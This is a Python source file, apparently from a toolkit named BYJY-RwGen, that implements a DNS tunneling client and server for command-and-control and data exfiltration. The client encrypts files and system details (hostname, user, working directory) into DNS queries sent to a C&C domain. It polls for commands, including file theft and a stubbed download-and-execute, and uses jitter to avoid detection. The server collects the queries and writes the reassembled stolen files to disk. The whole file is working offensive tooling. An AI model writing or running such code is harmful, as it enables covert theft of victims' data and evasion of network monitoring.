#!/usr/bin/env python3
"""
Advanced DNS Tunneling and Data Exfiltration - BYJY-RwGen
Covert communication channel via DNS queries for C&C and data exfiltration
"""

import dns.resolver
import dns.message
import dns.query
import dns.name
import base64
import json
import time
import random
import string
import threading
import queue
import hashlib
import hmac
import struct
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import socket
import binascii

class DNSTunnelClient:
    """DNS Tunneling client for covert communication and data exfiltration"""
    
    def __init__(self, domain, dns_servers=None, encryption_key=None):
        self.domain = domain
        self.dns_servers = dns_servers or ['1.1.1.1', '8.8.8.8', '208.67.222.222']
        self.session_id = self.generate_session_id()
        self.sequence_number = 0
        
        # Initialize encryption
        if encryption_key:
            self.cipher = self.init_encryption(encryption_key)
        else:
            self.cipher = None
            
        # Communication parameters
        self.max_chunk_size = 28  # DNS label max size minus overhead
        self.retry_attempts = 3
        self.retry_delay = 1.0
        self.jitter_range = (0.5, 2.0)
        
        # Statistics
        self.stats = {
            'queries_sent': 0,
            'responses_received': 0,
            'bytes_uploaded': 0,
            'bytes_downloaded': 0,
            'errors': 0
        }
    
    def init_encryption(self, password):
        """Initialize Fernet encryption with password-derived key"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'byjy_salt_2024',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return Fernet(key)
    
    def generate_session_id(self):
        """Generate unique session identifier"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    
    def encode_data(self, data):
        """Encode and encrypt data for DNS transmission"""
        if isinstance(data, str):
            data = data.encode()
        
        # Encrypt if cipher is available
        if self.cipher:
            data = self.cipher.encrypt(data)
        
        # Base32 encoding (DNS-safe, no padding issues)
        encoded = base64.b32encode(data).decode().lower()
        # Remove padding
        encoded = encoded.rstrip('=')
        
        return encoded
    
    def decode_data(self, encoded_data):
        """Decode and decrypt data from DNS response"""
        try:
            # Add padding back for base32
            padding_needed = (8 - len(encoded_data) % 8) % 8
            encoded_data += '=' * padding_needed
            
            # Decode from base32
            data = base64.b32decode(encoded_data.upper())
            
            # Decrypt if cipher is available
            if self.cipher:
                data = self.cipher.decrypt(data)
            
            return data
        except Exception as e:
            print(f"Decode error: {e}")
            return None
    
    def chunk_data(self, data, chunk_size):
        """Split data into DNS-safe chunks"""
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunks.append(data[i:i + chunk_size])
        return chunks
    
    def build_query_domain(self, command, data=None, chunk_index=0, total_chunks=1):
        """Build DNS query domain with embedded data"""
        # Format: {session}.{seq}.{cmd}.{chunk_idx}.{total}.{data}.{domain}
        
        components = [
            self.session_id,
            f"{self.sequence_number:04x}",  # Hex sequence number
            command[:3],  # Command truncated to 3 chars
            f"{chunk_index:02x}",
            f"{total_chunks:02x}"
        ]
        
        if data:
            # Split data into DNS label-sized chunks
            data_chunks = self.chunk_data(data, 63)  # Max DNS label length
            components.extend(data_chunks)
        
        # Add checksum for integrity
        query_data = '.'.join(components)
        checksum = hashlib.md5(query_data.encode()).hexdigest()[:4]
        components.append(checksum)
        
        # Final domain
        query_domain = '.'.join(components) + '.' + self.domain
        
        return query_domain
    
    def send_dns_query(self, query_domain, query_type='TXT'):
        """Send DNS query with retry logic and jitter"""
        for dns_server in self.dns_servers:
            for attempt in range(self.retry_attempts):
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [dns_server]
                    resolver.timeout = 10
                    resolver.lifetime = 30
                    
                    # Send query
                    response = resolver.resolve(query_domain, query_type)
                    
                    self.stats['queries_sent'] += 1
                    self.stats['responses_received'] += 1
                    
                    # Extract response data
                    response_data = []
                    for rdata in response:
                        if query_type == 'TXT':
                            # TXT records can contain our response data
                            txt_data = str(rdata).strip('"')
                            response_data.append(txt_data)
                    
                    return response_data
                    
                except Exception as e:
                    self.stats['errors'] += 1
                    print(f"DNS query failed (server: {dns_server}, attempt: {attempt+1}): {e}")
                    
                    # Jitter delay
                    delay = self.retry_delay * random.uniform(*self.jitter_range)
                    time.sleep(delay)
        
        return None
    
    def send_command(self, command, data=None):
        """Send command through DNS tunnel"""
        if data:
            encoded_data = self.encode_data(data)
            chunks = self.chunk_data(encoded_data, self.max_chunk_size)
        else:
            chunks = ['']
        
        responses = []
        
        for i, chunk in enumerate(chunks):
            query_domain = self.build_query_domain(
                command, chunk, i, len(chunks)
            )
            
            print(f"[+] Sending DNS query: {query_domain}")
            
            response = self.send_dns_query(query_domain)
            if response:
                responses.extend(response)
            
            # Increment sequence number
            self.sequence_number += 1
            
            # Add jitter between chunks
            if i < len(chunks) - 1:
                time.sleep(random.uniform(0.1, 0.5))
        
        return responses
    
    def exfiltrate_file(self, file_path, file_type='document'):
        """Exfiltrate file through DNS tunnel"""
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Prepare file metadata
            file_info = {
                'name': file_path.split('/')[-1],
                'size': len(file_data),
                'type': file_type,
                'timestamp': int(time.time())
            }
            
            # Send file info first
            info_response = self.send_command('info', json.dumps(file_info))
            
            # Send file data in chunks
            encoded_file = self.encode_data(file_data)
            chunk_size = self.max_chunk_size * 10  # Larger chunks for file data
            
            total_chunks = (len(encoded_file) + chunk_size - 1) // chunk_size
            
            for i in range(total_chunks):
                start_idx = i * chunk_size
                end_idx = min((i + 1) * chunk_size, len(encoded_file))
                chunk_data = encoded_file[start_idx:end_idx]
                
                # Send chunk
                chunk_info = {
                    'file': file_info['name'],
                    'chunk': i,
                    'total': total_chunks,
                    'data': chunk_data
                }
                
                response = self.send_command('file', json.dumps(chunk_info))
                
                self.stats['bytes_uploaded'] += len(chunk_data)
                
                print(f"[+] Uploaded chunk {i+1}/{total_chunks} for {file_info['name']}")
                
                # Progress delay
                time.sleep(random.uniform(0.5, 1.5))
            
            return True
            
        except Exception as e:
            print(f"File exfiltration failed: {e}")
            return False
    
    def receive_command(self):
        """Receive commands from C&C server"""
        response = self.send_command('poll')
        
        if response:
            for resp in response:
                try:
                    # Decode command from response
                    command_data = self.decode_data(resp)
                    if command_data:
                        return json.loads(command_data.decode())
                except Exception as e:
                    print(f"Command decode error: {e}")
        
        return None
    
    def send_heartbeat(self):
        """Send heartbeat to maintain session"""
        system_info = {
            'session': self.session_id,
            'timestamp': int(time.time()),
            'status': 'active',
            'stats': self.stats
        }
        
        return self.send_command('hb', json.dumps(system_info))
    
    def start_c2_loop(self, poll_interval=300):
        """Start continuous C&C communication loop"""
        print(f"[+] Starting DNS C&C loop (session: {self.session_id})")
        
        while True:
            try:
                # Send heartbeat
                self.send_heartbeat()
                
                # Check for commands
                command = self.receive_command()
                if command:
                    self.process_command(command)
                
                # Wait with jitter
                delay = poll_interval * random.uniform(0.8, 1.2)
                time.sleep(delay)
                
            except KeyboardInterrupt:
                print("\n[+] C&C loop interrupted")
                break
            except Exception as e:
                print(f"C&C loop error: {e}")
                time.sleep(60)  # Longer delay on error
    
    def process_command(self, command):
        """Process command received from C&C"""
        cmd_type = command.get('type')
        
        if cmd_type == 'exfil':
            # Exfiltrate specified files
            file_paths = command.get('files', [])
            for file_path in file_paths:
                self.exfiltrate_file(file_path)
        
        elif cmd_type == 'info':
            # Send system information
            import platform
            import os
            
            sys_info = {
                'hostname': platform.node(),
                'os': platform.system(),
                'arch': platform.machine(),
                'user': os.getenv('USER', 'unknown'),
                'cwd': os.getcwd()
            }
            
            self.send_command('sysinfo', json.dumps(sys_info))
        
        elif cmd_type == 'download':
            # Download and execute payload
            payload_url = command.get('url')
            if payload_url:
                print(f"[!] Download command: {payload_url}")
        
        print(f"[+] Processed command: {cmd_type}")

class DNSTunnelServer:
    """DNS Tunnel server for receiving exfiltrated data"""
    
    def __init__(self, listen_ip='0.0.0.0', listen_port=53):
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.sessions = {}
        self.received_files = {}
        
    def start_server(self):
        """Start DNS server to receive tunneled data"""
        print(f"[+] Starting DNS tunnel server on {self.listen_ip}:{self.listen_port}")
        
        # Create UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.listen_ip, self.listen_port))
        
        while True:
            try:
                data, addr = sock.recvfrom(1024)
                
                # Parse DNS query
                try:
                    dns_msg = dns.message.from_wire(data)
                    self.process_dns_query(dns_msg, addr, sock)
                except Exception as e:
                    print(f"DNS parsing error: {e}")
                    
            except Exception as e:
                print(f"Server error: {e}")
    
    def process_dns_query(self, dns_msg, client_addr, sock):
        """Process incoming DNS query and extract tunneled data"""
        for question in dns_msg.question:
            query_name = str(question.name).lower()
            
            # Parse tunneled data from domain name
            if self.parse_tunneled_data(query_name):
                # Send response
                response = self.build_dns_response(dns_msg, query_name)
                sock.sendto(response.to_wire(), client_addr)
    
    def parse_tunneled_data(self, query_name):
        """Parse and store tunneled data from DNS query"""
        try:
            parts = query_name.split('.')
            if len(parts) < 6:
                return False
            
            session_id = parts[0]
            seq_num = parts[1]
            command = parts[2]
            chunk_idx = int(parts[3], 16)
            total_chunks = int(parts[4], 16)
            
            # Extract data parts
            data_parts = parts[5:-2]  # Exclude checksum and domain
            data = '.'.join(data_parts)
            
            # Store data by session
            if session_id not in self.sessions:
                self.sessions[session_id] = {}
            
            session = self.sessions[session_id]
            
            if command not in session:
                session[command] = {}
            
            session[command][chunk_idx] = data
            
            # Check if all chunks received
            if len(session[command]) == total_chunks:
                # Reassemble data
                complete_data = ''
                for i in range(total_chunks):
                    complete_data += session[command].get(i, '')
                
                # Process complete command
                self.process_complete_command(session_id, command, complete_data)
                
                # Clear processed chunks
                del session[command]
            
            return True
            
        except Exception as e:
            print(f"Data parsing error: {e}")
            return False
    
    def process_complete_command(self, session_id, command, data):
        """Process complete reassembled command"""
        print(f"[+] Complete command from {session_id}: {command}")
        
        if command == 'file':
            self.process_file_data(session_id, data)
        elif command == 'info':
            self.process_file_info(session_id, data)
        elif command == 'hb':
            self.process_heartbeat(session_id, data)
    
    def process_file_data(self, session_id, data):
        """Process exfiltrated file data"""
        try:
            # Decode file chunk
            client = DNSTunnelClient('')  # For decode functions
            decoded_data = client.decode_data(data)
            
            if decoded_data:
                chunk_info = json.loads(decoded_data.decode())
                
                filename = chunk_info['file']
                chunk_num = chunk_info['chunk']
                total_chunks = chunk_info['total']
                chunk_data = chunk_info['data']
                
                # Store chunk
                file_key = f"{session_id}_{filename}"
                if file_key not in self.received_files:
                    self.received_files[file_key] = {}
                
                self.received_files[file_key][chunk_num] = chunk_data
                
                print(f"[+] Received file chunk {chunk_num+1}/{total_chunks} for {filename}")
                
                # Check if file is complete
                if len(self.received_files[file_key]) == total_chunks:
                    self.save_complete_file(session_id, filename)
        
        except Exception as e:
            print(f"File processing error: {e}")
    
    def save_complete_file(self, session_id, filename):
        """Save complete exfiltrated file"""
        try:
            file_key = f"{session_id}_{filename}"
            chunks = self.received_files[file_key]
            
            # Reassemble file data
            complete_data = ''
            for i in range(len(chunks)):
                complete_data += chunks[i]
            
            # Decode complete file
            client = DNSTunnelClient('')
            file_data = client.decode_data(complete_data)
            
            if file_data:
                # Save to disk
                output_path = f"exfiltrated_{session_id}_{filename}"
                with open(output_path, 'wb') as f:
                    f.write(file_data)
                
                print(f"[+] Saved exfiltrated file: {output_path}")
                
                # Cleanup
                del self.received_files[file_key]
        
        except Exception as e:
            print(f"File save error: {e}")
    
    def build_dns_response(self, query_msg, query_name):
        """Build DNS response with optional command data"""
        response = dns.message.make_response(query_msg)
        
        # Add TXT record with response data (if any)
        # This could contain commands for the client
        
        return response

# Command-line interface
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='DNS Tunnel Client/Server')
    parser.add_argument('mode', choices=['client', 'server'], help='Operation mode')
    parser.add_argument('--domain', default='c2.example.com', help='C&C domain')
    parser.add_argument('--dns-servers', nargs='+', default=['1.1.1.1', '8.8.8.8'], help='DNS servers')
    parser.add_argument('--key', help='Encryption key')
    parser.add_argument('--file', help='File to exfiltrate (client mode)')
    
    args = parser.parse_args()
    
    if args.mode == 'client':
        client = DNSTunnelClient(args.domain, args.dns_servers, args.key)
        
        if args.file:
            print(f"[+] Exfiltrating file: {args.file}")
            client.exfiltrate_file(args.file)
        else:
            print("[+] Starting C&C communication loop")
            client.start_c2_loop()
    
    elif args.mode == 'server':
        server = DNSTunnelServer()
        server.start_server()

if __name__ == "__main__":
    main()